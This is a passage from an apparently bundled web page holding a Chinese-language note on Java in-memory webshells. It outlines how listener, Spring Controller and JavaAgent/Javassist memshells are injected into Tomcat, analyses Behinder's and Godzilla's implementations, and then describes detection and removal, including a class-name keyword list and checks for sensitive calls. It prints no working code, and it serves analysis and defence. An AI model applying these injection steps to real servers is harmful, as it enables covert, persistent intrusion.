                      2\u3001\u521B\u5EFA\u4E00\u4E2AServletRequestListener\u5BF9\u8C61\u5E76\u91CD\u5199\u5176requestDestroyed\u65B9\u6CD5\uFF0C\u5728\u5176\u4E2D\u5B9E\u73B0\u547D\u4EE4\u6267\u884C\u5E76\u901A\u8FC7response\u56DE\u663E.
                      3\u3001\u5C06\u521B\u5EFA\u7684ServletRequestListener\u5BF9\u8C61\u901A\u8FC7StandardContext\u6DFB\u52A0\u5230\u4E8B\u4EF6\u76D1\u542C\u4E2D\u53BB
      2\u3001\u57FA\u4E8E\u52A8\u6001\u6DFB\u52A0\u6846\u67B6\u7EC4\u4EF6\u7684\u5185\u5B58\u9A6C\u5B9E\u73B0
          \u8FD9\u8FB9\u4E3B\u8981\u8BF4\u4E0B SpringBoot\u6846\u67B6 \u7684 \u7EC4\u4EF6\u5185\u5B58\u9A6C \u7684\u5B9E\u73B0\uFF1A
              1\u3001SpringBoot\uFF0C\u5728\u5904\u7406\u8BF7\u6C42\u7684\u65F6\u5019\u7684 \u4E3B\u8981\u903B\u8F91 \u662F\u5728Controller\u4E2D\u8FDB\u884C\u7684\uFF0C\u6240\u4EE5\u6211\u4EEC\u53EF\u4EE5\u4EE3\u7801\u5C42\u6B21\u6CE8\u518C\u4E00\u4E2A Controller \u6765\u5B9E\u73B0\u5185\u5B58\u9A6C\uFF1A
              2\u3001\u52A8\u6001\u6CE8\u518C\u4E00\u4E2AController\u7684\u4E3B\u8981\u601D\u8DEF\uFF1A
                      1\u3001\u4ECE SpringBoot\u4E2D \u83B7\u53D6\u4E0A\u4E0B\u6587 Context
                      2\u3001\u5B9A\u4E49\u597D\u8981\u6CE8\u5165Controller\u7684\u8DEF\u5F84\u4EE5\u53CA\u5904\u7406\u8BF7\u6C42\u4F7F\u7528\u7684\u903B\u8F91\uFF08\u65B9\u6CD5\uFF09\uFF0C\u8FD9\u91CC\u5177\u4F53\u5B9E\u73B0\u662F\u4F7F\u7528\u4E00\u4E2A\u6076\u610F\u7C7BEval.class\uFF0C\u901A\u8FC7\u53CD\u5C04\u83B7\u53D6\u5176\u5B9E\u73B0\u7684\u4E00\u4E2A\u6076\u610F\u65B9\u6CD5\u3002
                      3\u3001\u5229\u7528 mappingHandlerMapping.registerMapping\uFF08\uFF09 \u65B9\u6CD5\u5C06\u5176\u6CE8\u5165\u5230\u5904\u7406\u4E2D\u53BB
      3\u3001\u57FA\u4E8E JavaAgent \u548C JavAssist \u6280\u672F\u7684\u5185\u5B58\u9A6C\u5B9E\u73B0
          \u539F\u7406\uFF1A
              \u8BD5\u60F3\u5982\u679C\u6211\u4EEC\u80FD\u627E\u5230\u4E00\u4E9B\u5173\u952E\u7C7B\uFF0C\u8FD9\u4E9B\u5173\u952E\u7C7B\u662FTomcat\u6216\u76F8\u5173\u5BB9\u5668\u5904\u7406\u8BF7\u6C42\u7684\u5FC5\u7ECF\u7C7B\uFF0C
                  \u4E5F\u5C31\u662F\u8981\u8C03\u7528\u76F8\u5173\u7C7B\u7684\u76F8\u5173\u65B9\u6CD5\uFF0C\u5C31\u53EF\u4EE5\u5B8C\u5168\u6446\u8131url\u7684\u9650\u5236\uFF0C
                  \u90A3\u4E48\u6211\u4EEC\u518D\u901A\u8FC7 JavaAgent \u548C JavAssist \u5B9E\u73B0 \u8FD0\u884C\u65F6\u52A8\u6001\u4FEE\u6539\u5B57\u8282\u7801\u6765\u5B8C\u6210\u7C7B\u7684\u4FEE\u6539\u548C\u91CD\u8F7D\uFF0C\u4ECE\u4E2D\u4FEE\u6539\u67D0\u65B9\u6CD5\u7684\u5B9E\u73B0\u903B\u8F91\uFF0C\u5D4C\u5165\u547D\u4EE4\u6267\u884C\u5E76\u4E14\u56DE\u663E\uFF0C
                      \u90A3\u4E48\u662F\u4E0D\u662F\u540C\u6837\u53EF\u4EE5\u5B9E\u73B0\u5185\u5B58\u9A6C\u5462\uFF1F
          \u5B9E\u73B0\u601D\u8DEF\uFF1A
              \u9996\u5148\u6211\u4EEC\u8981\u627E\u5230Tomcat\u4E2D\u8BF7\u6C42\u5904\u7406\u7684\u5FC5\u7ECF\u7C7B\u4E5F\u5C31\u662F\u901A\u7528\u7C7B\u3002
                  \u5982\uFF1A\u4E0A\u6587\u63D0\u5230\u8FC7Tomcat\u4E2D\u7684WEB\u7EC4\u4EF6Filter\u7684\u5B9E\u73B0\uFF0C\u662F\u4E00\u4E2A FilterChain \u7684\u94FE\u5F0F\u8C03\u7528\uFF0C\u5BF9\u8BF7\u6C42\u505A\u5C42\u5C42\u8FC7\u6EE4\uFF1A
                      \u4E0A\u4E00\u4E2A filter \u8C03\u7528\u8BE5\u94FE\u7684\u4E0B\u4E00\u4E2A filter \u7684\u65F6\u5019\u662F\u901A\u8FC7 filterChain.doFilter \u65B9\u6CD5\u5B9E\u73B0\u7684\u3002
              \u8DDF\u8FDB \u662F\u8C03\u7528\u4E00\u4E2A\u5B9E\u73B0 FilterChain \u63A5\u53E3\u7684 ApplicationFilterChain \u7C7B\u7684 doFilter \u65B9\u5F0F\uFF0C\u5176\u5B9E\u73B0\u5982\u4E0B\uFF0C
                  \u6B63\u5E38\u60C5\u51B5\u4E0B\u5176\u5B9E\u73B0\u662F\u7531InternalDoFilter\uFF08\uFF09\u5B9E\u73B0\u7684\uFF0C\u5E76\u4F20\u5165\u5176request and response\u5BF9\u8C61\u3002
              \u6240\u4EE5\u6211\u4EEC\u8981\u627E\u7684\u901A\u7528\u7C7B\uFF0C\u5FC5\u7ECF\u65B9\u6CD5\u53EF\u4EE5\u662F ApplicationFilterChain \u7C7B\u7684 internalDoFilter\uFF08request\uFF0Cresponse\uFF09 \u3002

          \u5B9E\u73B0\u6B65\u9AA4\uFF1A
              Agent
                  1\u3001\u5B9A\u4E49 AgentThing \u7C7B\u5E76\u5B9A\u4E49 agentmain(String,Instrumentation) \u65B9\u6CD5\uFF0C\u5728\u65B9\u6CD5\u4E2D\u8C03\u7528 Instrumentation \u7684 addTransformer \u65B9\u6CD5\u6DFB\u52A0\u81EA\u5B9A\u4E49\u7684\u8F6C\u6362\u65B9\u6CD5\u3002
                  2\u3001\u68C0\u6D4B jvm \u52A0\u8F7D\u7C7B\uFF0C\u5F53\u5339\u914D\u5230\u4E86\u6211\u4EEC\u8981\u627E\u7684 ApplicationFilterChain\uFF08org.apache.catalina.core.ApplicationFilterChain\uFF09\u7C7B\uFF0C\u8C03\u7528 retransformClasses \u65B9\u6CD5\u8F6C\u6362\u3001\u6216\u8005\u8C03\u7528 redefineClasses \u65B9\u6CD5\u91CD\u8F7D\uFF0C
                          \u8FD9\u4E2A\u4E24\u79CD\u65B9\u6CD5\u90FD\u80FD\u5B9E\u73B0\u5B57\u8282\u7801\u7684\u4FEE\u6539\uFF0C\u4F46\u540E\u7EED\u9488\u5BF9\u8FD9\u4E24\u79CD\u5B9E\u73B0\u65B9\u5F0F\u7684\u4FEE\u590D\u548C\u68C0\u6D4B\u4E0A\u5B58\u5728\u5F88\u5927\u7684\u4E0D\u540C\uFF1B
                          \u4E0A\u9762\u8BB2 JavaAgent\u6280\u672F\u7684\u65F6\u5019\uFF0C\u6211\u4EEC\u4F7F\u7528\u7684\u662F redefineClasses \u6765\u5B9E\u73B0\u7684\uFF1B  \u8FD9\u91CC\u6211\u4EEC\u5B9E\u73B0\u7684\u65F6\u5019\u4F7F\u7528 retransformClasses \u3002
              \u8F6C\u6362\u7C7B
                  \u5B9A\u4E49 Agent \u4E2D\u4F7F\u7528\u5230\u7684 TransformerThings \u7C7B\uFF0C\u8BE5\u7C7B\u5B9E\u73B0 ClassFileTransformer \u63A5\u53E3\u5E76\u91CD\u5199\u5176\u62BD\u8C61\u65B9\u6CD5transform\uFF0C
                      \u5728\u8BE5\u65B9\u6CD5\u4E2D\u5B9E\u73B0\u4F7F\u7528 JavAssist \u6765\u4FEE\u6539\u5176\u5BF9\u5E94\u7C7B\u7684\u5B57\u8282\u7801\u5B9E\u73B0\uFF0C\u4E5F\u5C31\u662F\u63D2\u5165\u6211\u4EEC\u51C6\u5907\u597D\u7684 cmd\u547D\u4EE4 \u6267\u884C\u5E76\u56DE\u663E code \u3002
              Inject or Attach
                  \u5B9A\u4E49\u5E76\u5B9E\u73B0 AttachThing \u7C7B\uFF0C\u5229\u7528 Java Tools \u6765\u5B9E\u73B0 LoadAgent\uFF0C\u5411 JVM \u865A\u62DF\u673A\u7684\u7684 java\u5E94\u7528 \u6CE8\u5165agent\uFF1B
                      \u8FD9\u91CC\u6211\u4EEC\u5B9E\u73B0\u7684\u65F6\u5019\u9996\u5148\u901A\u8FC7 jps \u627E\u5230 Tomcat \u7684 pid\uFF0C
                          \u56E0\u4E3A Tomcat \u7684\u542F\u52A8\u6587\u4EF6\u53EB BootStrap\uFF0C\u800C jvm \u4E2D\u7684 jsp \u7684\u547D\u540D\u65B9\u6CD5\u662F\u901A\u8FC7\u542F\u52A8\u6587\u4EF6\u547D\u540D\uFF0C\u6240\u4EE5\u6211\u4EEC\u53EF\u4EE5\u901A\u8FC7\u8FD9\u79CD\u65B9\u5F0F\u6765\u627E\u5230\u5176 pid\uFF08\u8FDB\u7A0BID\uFF09\u3002
      4\u3001\u51B0\u874E\u4E2D\u7684\u5185\u5B58\u9A6C\u5B9E\u73B0
          \u6211\u4EEC\u901A\u8FC7\u5206\u6790\u51B0\u874E3\u6E90\u7801\u6765\u770B\u770B\u51B0\u874E\u4E2D\u5185\u5B58\u9A6C\u7684\u5177\u4F53\u5B9E\u73B0\uFF1A
                  1\u3001\u5728 MainController \u4E2D\u7684 loadContextMenu \u65B9\u6CD5\u4E2D \u5B9E\u73B0\u5BF9\u6CE8\u5165\u5185\u5B58\u9A6C\u6309\u94AE\u7684\u521D\u59CB\u5316\uFF0C\u63A5\u4E0B\u6765\u6211\u4EEC\u627E\u5230\u8BE5 button \u7684\u70B9\u51FB\u54CD\u5E94\u65B9\u6CD5\u7684\u5B9E\u73B0\u5373\u53EF
                  2\u3001\u627E\u5230 \u4FDD\u5B58\u5E76\u6CE8\u5165\u6309\u94AE \u7684\u70B9\u51FB\u52A8\u4F5C\u7684\u5B9E\u73B0
                          1\u3001\u9996\u5148\u6211\u4EEC\u53EF\u4EE5\u770B\u5230 \u51B0\u874E3 \u4E2D\u7684\u5185\u5B58\u9A6C\u4E2D\u6709 \u9632\u68C0\u6D4B \u8FD9\u4E00\u9009\u9879\uFF0C\u8FD9\u4E2A\u5728\u8FD9\u91CC\u5148\u63D0\u4E00\u4E0B\uFF0C\u540E\u7EED\u5728\u68C0\u6D4B\u7684\u67E5\u6740\u6280\u672F\u91CC\u9762\u8BE6\u7EC6\u8BF4\u3002
                          2\u3001saveBtn \u7684 setOnAction \u4E2D\u4E3B\u8981\u5B9E\u73B0\u903B\u8F91\u662F\u6709 injectMemShell \u6765\u5B9E\u73B0\u4E86\u7684
                  3\u3001\u63A5\u4E0B\u6765\u6211\u4EEC\u8DDF\u8FDBinjectMemShell\u65B9\u6CD5\uFF0C\u5728\u8BE5\u65B9\u6CD5\u7684\u5B9E\u73B0\u4E2D
                          xxxxxx
                  4\u3001\u63A5\u4E0B\u6765\u6211\u4EEC\u5177\u4F53\u627E\u5230\u5176 agent.jar \u6587\u4EF6\uFF0C\u5728 net/rebeyond/behinder/resource/tools \u76EE\u5F55\u4E2D\uFF1A
                          \u53EF\u4EE5\u770B\u5230\u4E0A\u9762\u56DB\u4E2Ajar\u6587\u4EF6\u5206\u522B\u5BF9\u5E94\uFF1AWindows\u3001Linux \u3001 Unix \u3001Mac
                          \u8FD9\u91CC\u6211\u4EEC\u770B\u4E0Bwindows\u7684\uFF1A
                                  \u4F7F\u7528xjad\u53CD\u7F16\u8BD1tools_0.jar\uFF1A
                                  \u53CD\u7F16\u8BD1\u4E4B\u540E\u67E5\u770BMemshell\u5B9E\u73B0\uFF1A
                                          \u5728\u5176agentmain\u65B9\u6CD5\u91CC\u9762\u5BF9\u76F8\u5173\u7EC4\u4EF6\u8FDB\u884C\u5224\u65AD\uFF0C\u4ECE\u800C\u9009\u62E9\u4E0D\u540C\u7684\u7C7B\uFF0C\u5E76\u5199\u5165\u5165shellcode\uFF1A
                                                  shellcode\u662F\u5199\u6B7B\u5728\u91CC\u9762\u7684\uFF0C\u4E0D\u540C\u7684\u65B9\u6CD5\u91CC\u9762\u505A\u4E00\u4E9B\u7B80\u5355\u7684\u66FF\u6362\u5373\u53EF\uFF1A
                                                          \u53EF\u4EE5\u770B\u5230\u5176\u5B9E\u73B0\u7684cmdshell\u8FD8\u662F\u4F7F\u7528\u7684\u662F\u51B0\u874E\u52A0\u5BC6\u7684\u90A3\u4E00\u5957\u3002
                                          \u6700\u540E\u7684\u8BDD\u662F\u914D\u5408javassist\u6765\u5B9E\u73B0\u8FD0\u884C\u65F6\u52A8\u6001\u5B57\u8282\u7801\u4FEE\u6539\uFF0C
                                                  \u9700\u8981\u6CE8\u610F\u7684\u662F\u8FD9\u91CC\u4F7F\u7528Instrumentation\u7684redefineclasses\u65B9\u6CD5\uFF0C\u548C\u4E0A\u6587\u4ECB\u7ECDjavaagent\u6280\u672F\u5C0Fdemo\u4F7F\u7528\u7684\u662F\u76F8\u540C\u7684\uFF0C
                                                  \u540C\u65F6\u8FD9\u91CC\u9009\u53D6\u7684\u901A\u7528\u7C7B\u662Fjakarta.servlet.http.HttpServlet\uFF1A
                                                  \u5E76\u4E14\u5176 doAgentShell \u91CC\u9762\u5B9E\u73B0\u4E86\u4E0A\u6587\u63D0\u53CA\u7684 attach\u6CE8\u5165\uFF1A
                  5\u3001\u4EE5\u4E0A\u4FBF\u662F\u51B0\u874E3\u7684\u5185\u5B58\u9A6C\u5B9E\u73B0\uFF0C\u662F\u901A\u8FC7agent\u6CE8\u5165\u6765\u5B9E\u73B0\u7684\uFF0C
                          \u6700\u65E9\u662F18\u5E74\u51B0\u874E\u7684\u4F5C\u8005 rebeyond \u5728\u5176 memshell \u9879\u76EE\u9879\u76EE\u4E2D\u7528\u5230\uFF0C\u540E\u7EED\u88AB\u878D\u5165\u8FDB\u51B0\u874E\u4E2D\uFF1B
                                  \u5982\u4E0B\u56FE\u662Fmemshell\u9879\u76EE\u4E2Dagent\u7684\u5B9E\u73B0\uFF1A
                                          \u53EF\u4EE5\u770B\u5230memshell\u9879\u76EE\u4E2D\u8C03\u7528\u7684\u662FInstrumentation.retransformClasses()\u65B9\u6CD5\u6765\u5B9E\u73B0\u7684\uFF0C
                                                  \u800C\u4E0A\u6587\u4E2D\u4E5F\u6709\u63D0\u53CA\u73B0\u5728\u7684\u51B0\u874E3\u5374\u4E0D\u662F\u8FD9\u6837\u7684\uFF0C\u662F\u901A\u8FC7Instrumentation.redefineClasses\u65B9\u6CD5\u5B9E\u73B0\u7684\uFF0C\u90A3\u4E48\u4E3A\u4EC0\u4E48\u8FD9\u91CC\u8981\u53D1\u751F\u6539\u53D8\u4E86\uFF0C\u662F\u4E24\u4E2A\u968F\u4FBF\u7528\u5417\uFF1F
                                                          \u8FD9\u91CC\u9762\u5C31\u6D89\u53CA\u5230agent\u6280\u672F\u672C\u8EAB\u4EE5\u53CA\u5185\u5B58\u9A6C\u7684\u68C0\u6D4B\u7684\u4E00\u4E9B\u95EE\u9898\u4E86\uFF0C\u4E0B\u9762\u5185\u5B58\u9A6C\u7684\u68C0\u6D4B\u91CC\u9762\u5C55\u5F00\u8BF4
      5\u3001\u54E5\u65AF\u62C9\u4E2D\u7684\u5185\u5B58\u9A6C\u5B9E\u73B0
          \u7ED3\u5408 \u54E5\u65AF\u62C9\u6E90\u7801 \u548C \u54E5\u65AF\u62C9\u6D41\u91CF \u7B80\u5355\u5206\u6790\u4E0B\u5185\u5B58\u9A6C\u5728\u54E5\u65AF\u62C9\u4E2D\u7684\u5B9E\u73B0
                  \u6293\u53D6\u54E5\u65AF\u62C9\u6CE8\u5165\u5185\u5B58\u9A6C\u4EE5\u53CA\u5378\u8F7D\u5185\u5B58\u9A6C\u6D41\u91CF\u3002
                          \u6293\u53D6\u7684\u6D41\u91CF\u4E3B\u8981\u5206\u4E3A\u4E09\u5927\u90E8\u5206
                                  1\u3001\u54E5\u65AF\u62C9\u7684\u9996\u6B21\u52A0\u8F7D\u4F7F\u7528\u7684payload\u7C7B\uFF0C\u5E76\u521D\u59CB\u5316
                                  2\u3001\u6CE8\u5165\u5185\u5B58\u9A6C
                                  3\u3001\u5378\u8F7D\u5185\u5B58\u9A6C
                  \u548C\u51B0\u874E\u4E0D\u540C\u54E5\u65AF\u62C9\u5E76\u4E0D\u662F\u6BCF\u6B21\u90FD\u53D1\u9001\u4E00\u4E2A\u6784\u9020\u597D\u7684payload\uFF1A
                          \u5982\u4E0B\u56FE\u662F\u51B0\u874E Java \u7684 Payload \u7684\u7C7B\u578B\uFF0C\u5176\u4E2DBasicInfo\u662F\u9996\u6B21\u52A0\u8F7D\u4F7F\u7528\u7684\u57FA\u7840\u4FE1\u606F\u83B7\u53D6\uFF1A
                                  xxxxxx
                          \u54E5\u65AF\u62C9\u7684\u6A21\u5F0F\u662F\uFF0C\u7B2C\u4E00\u6B21\u57FA\u672C\u52A0\u8F7D\u5168\u90E8\u529F\u80FD \u8981\u4F7F\u7528 payload \u5230\u670D\u52A1\u7AEF\u4E2D session \u4E2D\u5B58\u50A8\u5E76\u4F7F\u7528\uFF0C
                                  \u6240\u4EE5\u5728\u9996\u6B21\u8FDE\u63A5\u7684\u65F6\u5019\u53D1\u9001\u7684\u52A0\u5BC6\u6D41\u91CF\u4F1A\u6BD4\u8F83\u5927\uFF0C\u540E\u7EED\u7684\u8BDD\u5C31\u57FA\u672C\u5C31\u662F\u52A0\u5BC6\u4F20\u8F93\u76F8\u5173\u51FD\u6570\u540D\u548C\u53C2\u6570\u8C03\u7528\uFF0C\u6765\u5B8C\u6210\u3002
                                  1\u3001\u9996\u5148\u6211\u4EEC\u6765\u770B\u4E0B\u9996\u6B21\u52A0\u8F7D\u4EA7\u751F\u7684\u52A0\u5BC6\u6D41\u91CF
                                          xxxxxx
                                          \u89E3\u5BC6\u7684\u5DE5\u5177\uFF1A
                                                  \u3010WebShellDecoder\u3011    https://github.com/minhangxiaohui/DecodeSomeJSPWebshell
                                                          \uFF08\u9700\u8981\u77E5\u9053key\u624D\u884C\uFF0C\u7136\u540E\u505A\u4E86\u4E2AAES\uFF09
                                  2\u3001\u52A0\u8F7D\u5185\u5B58\u9A6C\u65F6\uFF0C\u5BA2\u6237\u7AEF\u53D1\u5F80\u670D\u52A1\u5668\u7684\u8BF7\u6C42\u6D41\u91CF
                                          xxxxxx
          \u4EE5\u4E0A\u662F\u54E5\u65AF\u62C9\u5185\u5B58\u9A6C\u7684\u5B9E\u73B0\uFF1B\u53EF\u4EE5\u770B\u5230\u54E5\u65AF\u62C9\u548C\u51B0\u874E\u5B9E\u73B0\u5185\u5B58\u9A6C\u7684\u65B9\u5F0F\u662F\u4E0D\u4E00\u6837\u7684\uFF0C
                  \u54E5\u65AF\u62C9\u9009\u62E9\u7684\u662F\u52A8\u6001\u6CE8\u518CServlet\u7EC4\u4EF6\u6765\u5B9E\u73B0\u5185\u5B58\u9A6C\u7684\u6CE8\u5165\uFF0C\u800C\u51B0\u874E\u5219\u662F\u901A\u8FC7javaagent\u6280\u672F\u914D\u5408javassist\u6280\u672F\u6765\u5B9E\u73B0\u5185\u5B58\u9A6C\u7684\u6CE8\u5165\u3002
  `),Object(u.c)("\u5185\u5B58\u9A6C\u7684\u68C0\u6D4B\u3001\u67E5\u6740\u6280\u672F",`

      \u7B80\u7B54\uFF1A
              github\u6709\u5927\u4F6C\u5199\u8FC7\u5185\u5B58\u5BF9\u8C61\u641C\u7D22\u5DE5\u5177\uFF0C\u4E4B\u524D\u770B\u8FC7\u4E00\u7BC7\u76F8\u5173\u7684\u6587\u7AE0\uFF0C\u7136\u540E\u5C55\u5F00\u7F16\u4E86\u4E00\u4E9B\u3002
              \u4E3B\u8981\u601D\u8DEF\u662F\uFF1A
                      1\u3001\u5229\u7528Java Agent\u6280\u672F\u904D\u5386 \u6240\u6709\u5DF2\u7ECF\u52A0\u8F7D\u5230\u5185\u5B58\u4E2D\u7684Class\uFF0C\u770B\u662F\u5426\u6076\u610F\u7C7B\u540D\uFF1B
                      2\u3001\u518D web.xml \u662F\u5426\u5339\u914D\u5F97\u5230\uFF1B
                      3\u3001\u662F\u5426\u80FD\u627E\u5230 \u672C\u5730ClassPath \u4E0B\u7684\u5B57\u8282\u7801\u6587\u4EF6\uFF1B
                      4\u3001ClassLoader\u662F\u5426\u5408\u6CD5\uFF1B


      1\u3001\u7B2C\u4E09\u7C7B\u5185\u5B58\u9A6C\uFF08Agent\u578B\u5185\u5B58\u9A6C\uFF09\uFF0C\u7684\u68C0\u6D4B\u548C\u67E5\u6740
          \u68C0\u6D4B\u7684\u65F6\u5019\u53EF\u4EE5\uFF0C\u68C0\u6D4B\u4E00\u4E9B Tomcat \u6216\u76F8\u5173\u5BB9\u5668\u4E2D\u5E38\u89C1\u7684\u7EDF\u7528\u7C7B\u7684\u901A\u7528\u65B9\u6CD5\uFF0C\u5982\u4E0A\u6587\u63D0\u5230\u7684 ApplicationFilterChain \u7C7B\u7684 dointernalFilter \u65B9\u6CD5\uFF1A
                  \u4E0B\u9762\u6211\u4EEC\u5229\u7528 JavaAgent \u672C\u8EAB\u6765\u68C0\u6D4B\u5E76\u67E5\u6740\u4E0A\u6587\u4E2D\u5B9E\u73B0\u7684\u7B2C\u4E09\u79CD\u5185\u5B58\u9A6C\uFF0C\u4E5F\u5C31\u662F retransformClasses \u65B9\u6CD5\u5B9E\u73B0\u7684agent\u578B\u5185\u5B58\u9A6C:
                          1\u3001\u76F4\u63A5\u9488\u5BF9ApplicationFilterChain\u7C7B\u7684dointernalFilter\u6765\u68C0\u6D4B\u548C\u67E5\u6740\uFF1A
                                  Demo\u9879\u76EE\u5730\u5740\uFF1A    https://github.com/minhangxiaohui/Memshel_Scanner
                          2\u3001\u67E5\u6740\u4F7F\u7528\u7684Agent\uFF1A\u8FD9\u91CC\u4F7F\u7528\u7684Agent\u548C\u4E0A\u6587\u5B9E\u73B0agent\u578B\u5185\u5B58\u9A6C\u539F\u7406\u662F\u4E00\u81F4\u7684
                          3\u3001\u67E5\u6740\u4F7F\u7528\u7684Transformer\uFF1A
                                  \u8FD9\u91CC\u662F\u67E5\u6740\u7684\u4E3B\u8981\u903B\u8F91\u70B9\uFF0C\u7531\u4E0A\u6587\u6211\u4EEC\u53EF\u77E5\u5229\u7528Instrumentation.retransformClasses()\u5B9E\u73B0\u7684agent\u578B\u5185\u5B58\u9A6C\uFF0C\u5728\u4E0B\u4E00\u6B21\u91CD\u8F7D\u7684\u65F6\u5019\u53EF\u4EE5\u4ECEtransform\u65B9\u6CD5\u4E2D\u63A5\u6536\u5230\u524D\u4E00\u6B21\u91CD\u8F7D\u4FEE\u6539\u540E\u7684\u5B57\u8282\u7801\uFF0C
                                          \u8FD9\u91CC\u662F\u901A\u8FC7\u53C2\u6570classfileBuffer\u6765\u4F20\u9012\u7684\uFF0C\u6240\u4EE5\u6211\u4EEC\u67E5\u6740\u7684\u7B80\u5355\u601D\u8DEF\u5C31\u662F\uFF1A
                                                  1\u3001\u83B7\u53D6\u4F20\u5165\u7684classfileBuffer\u53C2\u6570\uFF0C\u5982\u679C\u8BE5\u5904\u88AB\u66F4\u6539\u5B9E\u73B0\u4E86\u5185\u5B58\u9A6C\uFF0C\u90A3\u4E48\u548C\u6700\u539F\u59CB\u80AF\u5B9A\u4E0D\u4E00\u6837
                                                  2\u3001\u901A\u8FC7javassist\u83B7\u53D6\u5BF9\u5E94\u8981\u68C0\u6D4B\u7C7B\u7684\u539F\u59CB\u5B57\u8282\u7801\uFF08\u8FD9\u91CC\u4E5F\u5C31\u662F org/apache/catalina/core/ApplicationFilterChain \u7C7B\uFF09
                                                  3\u3001\u505A\u4E00\u4E2A\u5BF9\u6BD4\uFF0C\u5982\u679C\u4E0D\u4E00\u81F4\u5C31\u8BF4\u660E\u88AB\u91CD\u8F7D\u8FC7\uFF0C\u8FD9\u91CC\u6211\u4EEC\u4E5F\u53EF\u4EE5\u8FDB\u4E00\u6B65\u5339\u914D\u91CD\u8F7D\u5B57\u8282\u7801\u91CC\u9762\u662F\u5426\u5B58\u5728\u4E00\u4E9B\u654F\u611F\u7C7B\u7684\u8C03\u7528\uFF0C\u5982Runtime\u3001ProcessBuilder\u7B49\u6700\u540E\u6765\u786E\u5B9A\u88AB\u8F7D\u5165\u4E86\u5185\u5B58\u9A6C\uFF0C
                                                          \u8FD9\u91CC\u4E0B\u9762\u7684demo\u4E2D\u5C31\u4E0D\u505A\u8FD9\u90E8\u5206\u5DE5\u4F5C\u4E86\uFF0C\u56E0\u4E3A\u77E5\u9053\u6211\u4EEC\u4E4B\u524D\u662F\u4F7F\u7528 Agent\u6CE8\u5165 \u91CD\u8F7D ApplicationFilterChain return\u7684dointernalFilter()\u65B9\u6CD5\uFF0C
                                                                  \u6240\u4EE5\u5728\u8FD9\u91CC\u6211\u4EEC\u76F4\u63A5\u66FF\u6362\u6210\u91CD\u65B0\u4ECE JavAssist \u4E2D\u53D6\u51FA\u6765\u7684\u8BE5\u7C7B\u7684\u539F\u59CB\u5B9E\u73B0\uFF0C\u4ECE\u800C\u5B9E\u73B0\u4E86\u68C0\u67E5\u548C\u4FEE\u590D\u7684\u76EE\u7684\u3002
                          4\u3001\u67E5\u6740\u4F7F\u7528\u7684Attach\uFF1A\u8FD9\u91CC\u4F7F\u7528\u7684Attache\u548C\u4E4B\u524D\u5B9E\u73B0\u5185\u5B58\u9A6C\u65F6\u7684\u539F\u7406\u4E00\u81F4

      2\u3001\u7B2C\u4E00\u7C7B\uFF08\u52A8\u6001\u6CE8\u518CServlet\u7EC4\u4EF6\uFF09\u548C\u7B2C\u4E8C\u7C7B\u5185\u5B58\u9A6C\uFF08\u52A8\u6001\u6CE8\u518C\u6846\u67B6\u7EC4\u4EF6\uFF09\u7684\u68C0\u6D4B\u548C\u67E5\u6740
          \u8FD9\u4E24\u7C7B\u5185\u5B58\u9A6C\u7684\u5B9E\u73B0\u539F\u7406\uFF0C\u90FD\u662F\uFF1A
                  \u90FD\u662F\u901A\u8FC7\u52A8\u6001\u6CE8\u518C\u7EC4\u4EF6\u6765\u5B9E\u73B0\u7684\u3002
          \u5206\u6790\uFF1A
                  \u5728\u52A8\u6001\u6CE8\u518C\u7EC4\u4EF6\u7684\u65F6\u5019\uFF0C\u4E0D\u7BA1\u662F\u6CE8\u518C\u7684\u662FServlet\u8FD8\u662FFilter\u3001Listener\u3001Controller\uFF0C\u5176\u90FD\u8981\u521B\u5EFA\u65B0\u7684\u7C7B\u5E76\u7EE7\u627F\u76F8\u5E94\u7EC4\u4EF6\u7684\u7236\u7C7B\u3002
                  \u65B0\u521B\u5EFA\u7684\u7C7B\u52A0\u8F7D\u5230 JVM \u5185\u5B58\u4E2D\u4E4B\u540E\uFF0C\u6211\u4EEC\u5C31\u53EF\u4EE5\u901A\u8FC7 Java Tools \u4E2D\u7684Instrumentation.getAllLoadedClasses()\u83B7\u53D6\u5230\uFF0C\u6240\u4EE5\u8FD9\u4E24\u7C7B\u5185\u5B58\u9A6C\u4E5F\u53EF\u4EE5\u901A\u8FC7javaagent\u6280\u672F\u6765\u5B9E\u73B0\u67E5\u6740\u3002
                          \u53EA\u662F\u901A\u8FC7Instrumentation.getAllLoadedClasses()\u83B7\u53D6\u5230\u5BF9\u5E94\u7C7B\u540D\u4E4B\u540E\u7684\u8FC7\u6EE4\u6761\u4EF6\u4E0D\u540C\u4E86\uFF0C
                                  \u67E5\u6740agent\u578B\u5185\u5B58\u9A6C\u7684\u65F6\u5019\uFF0C\u6211\u4EEC\u662F\u901A\u8FC7\u68C0\u67E5\u5E38\u89C1\u901A\u7528\u7C7B\u7684\u5B57\u8282\u7801\u5B9E\u73B0\u662F\u5426\u53D1\u751F\u4E86\u6539\u53D8\u6765\u5B9E\u73B0\u5185\u5B58\u9A6C\u7684\u6392\u67E5\uFF1B
                                  \u9488\u5BF9\u7B2C\u4E00\u7C7B\u548C\u7B2C\u4E8C\u7C7B\u7684\u8BDD\u5C31\u5B58\u5728\u4E00\u4E9B\u5DEE\u5F02\uFF1A
                                          1\u3001\u9996\u5148\u5148\u5224\u65AD\u52A0\u8F7D\u5230\u5185\u5B58\u4E2D\u7684\u7C7B\uFF0C\u4ECE\u7C7B\u7EE7\u627F\u7684\u89D2\u5EA6\u53BB\u5224\u65AD\u662F\u5426\u7EE7\u627F\u4E86\u5982 javax.servlet.Servlet \u3001 javax.servlet.Filter \u3001 javax.servlet.ServletRequestListener \u63A5\u53E3
                                          2\u3001\u5BF9\u4E8E\u300A1\u300B\u4E2D\u5339\u914D\u5230\u7684\u7C7B\u80AF\u5B9A\u4E5F\u4E0D\u80FD\u4E00\u68D2\u5B50\u6253\u6B7B\uFF0C\u56E0\u4E3A\u6B63\u5E38\u5B9E\u73B0\u7684\u7EC4\u4EF6\u90FD\u4F1A\u5339\u914D\u5230\uFF0C\u6240\u4EE5\u6211\u4EEC\u8FD8\u8981\u8FDB\u4E00\u6B65\u7684\u68C0\u6D4B\u5185\u5B58\u9A6C\u7684\u7279\u5F81\uFF1A
                                                  1\u3001\u7C7B\u540D\u5173\u952E\u8BCD\u68C0\u6D4B\uFF0C\u68C0\u6D4B\u7C7B\u540D\u662F\u5426\u5B58\u5728\u5982\uFF1Ashell\u3001memshell\u3001noshell\u3001cmd\u7B49\u654F\u611F\u8BCD
